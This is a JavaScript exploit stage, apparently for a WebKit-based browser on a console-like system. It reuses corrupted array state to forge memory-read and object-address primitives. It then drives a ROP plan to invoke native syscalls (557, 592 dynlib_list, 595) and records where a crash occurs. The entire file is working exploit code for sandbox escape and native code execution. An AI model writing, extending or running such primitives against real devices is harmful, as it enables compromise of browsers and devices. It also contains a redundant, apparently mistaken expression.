// Syscall 595 crash narrowing: v3 pair probe caused a WebProcess fault.
// Each test isolates one argument to find the exact crash shape.
// T1: 595(id, 0, 0) — handle only, no output buffer
// T2: 595(0, buf, len) — buffer only, no handle
// T3: 557(name) → 595(handle, 0, 0) — 557 handle, no buffer
// T4: 592 module handle → 595(modHandle, 0, 0) — known module handle
// Each test: mark before → syscall → mark after. If death, last marker
// identifies the faulting shape. Safe mark() helper throughout.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      !state.view || !state.array || !state.a || !state.ownedTypedView ||
      !Number.isSafeInteger(state.calibratedViewBase) ||
      state.array[0] !== state.a || !plan.store || !plan.pivot ||
      !plan.stack || !plan.frame || !plan.addresses ||
      !Number.isSafeInteger(plan.target) ||
      !Number.isSafeInteger(plan.webkitBase) ||
      typeof native.wrappers.sys557 !== "number" ||
      typeof native.wrappers.sys595 !== "number")
    throw new Error("chain_or_wrappers_missing");
  var forged = state.view;
  var carrier = state.ownedTypedView;
  var base = state.calibratedViewBase;
  if (carrier.length !== 65536 || carrier[0] !== 0x31 ||
      carrier[7] !== 0xa8 || base % 4096 !== 0)
    throw new Error("carrier_canary_changed");
  function bytesAt(index, count) {
    var out = [];
    for (var n = 0; n < count; n++) out.push(forged[index + n]);
    return out;
  }
  function valueOf(bytes) {
    var value = 0;
    for (var n = bytes.length - 1; n >= 0; n--)
      value = value * 256 + bytes[n];
    return value;
  }
  function pointerBytes(value) {
    if (!Number.isSafeInteger(value) || value < 0 ||
        value >= 0x1000000000000)
      throw new Error("pointer_invalid");
    var out = [];
    for (var n = 0; n < 8; n++)
      out.push(Math.floor(value / Math.pow(2, n * 8)) & 255);
    return out;
  }
  function addressOf(object) {
    try {
      state.array[0] = object;
      return valueOf(bytesAt(state.index, 8));
    } finally {
      state.array[0] = state.a;
    }
  }
  var carrierIndex = addressOf(carrier) - base;
  var carrierSlot = carrierIndex + 8;
  if (!Number.isSafeInteger(carrierSlot) || carrierSlot < 0 ||
      carrierSlot + 8 >= 16777216)
    throw new Error("carrier_slot_invalid");
  var carrierOriginal = bytesAt(carrierSlot, 8);
  function readAt(addressValue, count) {
    if (!Number.isSafeInteger(addressValue) || count < 1 || count > 192)
      throw new Error("read_args_invalid");
    var next = pointerBytes(addressValue);
    try {
      for (var n = 0; n < 8; n++) forged[carrierSlot + n] = next[n];
      var out = [];
      for (var r = 0; r < count; r++) out.push(carrier[r]);
      return out;
    } finally {
      for (var x = 0; x < 8; x++)
        forged[carrierSlot + x] = carrierOriginal[x];
    }
  }
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("narrow_preflight");
  // Shared: out buffer at frame+0x700, 0x100 bytes
  var outOff = 0x700, outLen = 0x100;
  var outAddr = plan.addresses.frame + outOff;
  // Step 1: 557 allocate to get a handle
  phase = "alloc_557";
  mark("narrow_alloc_557");
  var nameOff = 0x900;
  var nameAddr = plan.addresses.frame + nameOff;
  var nameText = "Fw14NarrowTest";
  plan.frame.fill(0, nameOff, nameOff + 0x80);
  for (var ni = 0; ni < nameText.length; ni++)
    plan.frame[nameOff + ni] = nameText.charCodeAt(ni) & 255;
  var call557 = native.call("sys557", [nameAddr, nameText.length + 1]);
  var errno557 = (call557.value === -1) ? native.readErrno() : null;
  var handle557 = call557.value;
  // Step 2: get a known module handle from 592
  phase = "list_592";
  var listBufOff = 0x200;
  var listBufAddr = plan.addresses.frame + listBufOff;
  plan.frame.fill(0, listBufOff, listBufOff + 0x400);
  var call592 = native.call("dynlib_list", [listBufAddr, 0x400]);
  var modHandle = (plan.frame[listBufOff + 8]) |
                  (plan.frame[listBufOff + 9] << 8) ||
                  (plan.frame[listBufOff + 8]) |
                  (plan.frame[listBufOff + 9] << 8);
  // Take the second entry (skip leading null/count)
  var modHandleVal = (plan.frame[listBufOff + 12]) |
                     (plan.frame[listBufOff + 13] << 8);
  if (modHandleVal === 0)
    modHandleVal = (plan.frame[listBufOff + 4]) |
                   (plan.frame[listBufOff + 5] << 8);
  mark("narrow_592_list");
  var trials = [
    { label: "t1_id_nobuf", args: [handle557, 0, 0, 0, 0, 0] },
    { label: "t2_buf_noid", args: [0, outAddr, outLen, 0, 0, 0] },
    { label: "t3_557id_nobuf", args: [handle557, 0, 0, 0, 0, 0] },
    { label: "t4_modid_nobuf", args: [modHandleVal, 0, 0, 0, 0, 0] },
    { label: "t5_557id_buf", args: [handle557, outAddr, outLen, 0, 0, 0] }
  ];
  var results = [];
  for (var t = 0; t < trials.length; t++) {
    phase = "trial_" + trials[t].label;
    mark("narrow_" + trials[t].label + "_before");
    var call = native.call("sys595", trials[t].args);
    var errno = (call.value === -1) ? native.readErrno() : null;
    mark("narrow_" + trials[t].label + "_after");
    results.push(trials[t].label + ":ret" + call.value +
      "/e" + errno);
  }
  mark("narrow_done");
  var after = native.call("getpid", []);
  result = { id: "narrow_595_v1",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { handle557: handle557, errno557: errno557,
      mod_handle: modHandleVal,
      trials: results.join(" | "),
      pid_ok: after.value === before.value && after.high === 0 } };
} catch (error) {
  result = { id: "narrow_595_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
